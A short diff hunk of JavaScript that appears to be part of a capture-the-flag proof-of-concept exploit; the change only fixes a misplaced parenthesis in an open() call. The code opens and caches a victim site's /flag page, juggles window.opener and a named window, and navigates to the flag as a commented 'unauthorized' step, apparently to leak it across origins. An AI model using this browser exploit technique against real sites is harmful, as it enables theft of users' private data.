@@ -6,7 +6,7 @@
     const name = 'WIN'
     if (!opener) {
         open(`${victim}/flag`); // cache flag
-        open(`${domain}/poc)`; // opener
+        open(`${domain}/poc`); // opener
         location = `${victim}/flag`; // unauthorized
     } else {
         open(`${domain}/x`, 'WIN');
